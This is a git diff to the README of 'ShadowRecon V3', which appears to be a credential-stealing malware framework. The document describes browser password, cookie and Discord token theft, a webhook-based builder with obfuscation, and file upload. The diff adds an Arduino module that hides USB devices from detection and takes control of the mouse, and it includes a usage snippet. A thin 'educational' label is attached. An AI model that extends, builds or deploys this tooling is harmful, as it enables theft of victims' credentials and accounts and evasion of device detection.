@@ -55,14 +55,19 @@ src/
 │   ├── browsers/     # Browser data collection
 │   │   ├── collector.js # Main collection orchestrator
 │   │   └── decryptor.js # Browser data decryption
-│   └── screenshot/   # Screen capture functionality
-│       └── capture.js # Desktop screenshot capture
+│   ├── screenshot/   # Screen capture functionality
+│   │   └── capture.js # Desktop screenshot capture
+│   └── arduino/      # Arduino device spoofing
+│       ├── spoofer.js  # Arduino device spoofing engine
+│       └── collector.js # Arduino data collection
 ├── services/         # External services integration
 │   ├── discord/      # Discord integration
 │   │   ├── service.js # Main Discord service
 │   │   └── browserService.js # Browser-specific Discord data
-│   └── upload/       # File upload services
-│       └── service.js # Upload and hosting integration
+│   ├── upload/       # File upload services
+│   │   └── service.js # Upload and hosting integration
+│   └── arduino/      # Arduino service integration
+│       └── service.js # Arduino service layer
 └── main.js          # Application entry point and orchestration
 ```
 
@@ -241,6 +246,53 @@ node build/builder.js <webhook> <n> --obfuscate --compress --target node16-win-x
 └─────────────────┘    └──────────────────┘    └─────────────────┘
 ```
 
+## 🔌 Arduino Device Spoofing
+
+ShadowRecon V3 includes advanced Arduino device spoofing capabilities for educational and research purposes:
+
+### Key Features
+- **Cross-Platform Device Detection**: Automatic enumeration of Arduino and USB devices on Windows, Linux, and macOS
+- **USB Host Shield Hiding**: Advanced spoofing to hide USB Host Shield devices from detection
+- **Device Masquerading**: Spoofs Arduino devices as generic USB devices using common names
+- **Mouse Control**: USB Host Shield-based mouse control with movement and click commands
+- **Real-Time Statistics**: Comprehensive tracking of spoofing operations and device status
+
+### Supported Devices
+- **Arduino Boards**: All Arduino variants (Uno, Nano, Mega, etc.)
+- **USB Host Shields**: USB Host Shield v1.x and v2.x
+- **Arduino-Compatible Devices**: Third-party Arduino-compatible boards
+- **HID Devices**: Arduino-based keyboard/mouse emulators
+
+### Technical Implementation
+```javascript
+// Automatic device enumeration and spoofing
+const arduinoService = serviceManager.getService('arduino');
+const results = await arduinoService.collect();
+
+// Manual mouse control via USB Host Shield
+await arduinoService.moveMouse(10, 20);
+await arduinoService.clickMouse('left', true);
+```
+
+### Output Files
+- `Arduino/devices.txt` - Enumerated device list with spoofing status
+- `Arduino/spoofing_status.txt` - Detailed spoofing operation results
+- `Arduino/operation_logs.txt` - Complete operation history
+- `Arduino/raw_data.json` - Raw data for analysis
+
+### Configuration
+```json
+{
+  "modules": {
+    "enabled": {
+      "arduino": true
+    }
+  }
+}
+```
+
+For detailed technical documentation, see [ARDUINO_SPOOFING.md](docs/ARDUINO_SPOOFING.md).
+
 ## 🛡️ Security Features
 
 ### Built-in Protection
@@ -300,6 +352,7 @@ The framework provides comprehensive real-time tracking and monitoring:
 ### Data Collection Metrics
 - **Browser Data**: Passwords, cookies, autofill data, browsing history
 - **Discord Accounts**: Token extraction, account validation, deduplication
+- **Arduino Devices**: USB device enumeration, spoofing operations, mouse control
 - **System Information**: Hardware specs, OS details, network configuration
 - **File Operations**: Archive creation, compression ratios, upload status
 - **Module Performance**: Execution times, success rates, error tracking
